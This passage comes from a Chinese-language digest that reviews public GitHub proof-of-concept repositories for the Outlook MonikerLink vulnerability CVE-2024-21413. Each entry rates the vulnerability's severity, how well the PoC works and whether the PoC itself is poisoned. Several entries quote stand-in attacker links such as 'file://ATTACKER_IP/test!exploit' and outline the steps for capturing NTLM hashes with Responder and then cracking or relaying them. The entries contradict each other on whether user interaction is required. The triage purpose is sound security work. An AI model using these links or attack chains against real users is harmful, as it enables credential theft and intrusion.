CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

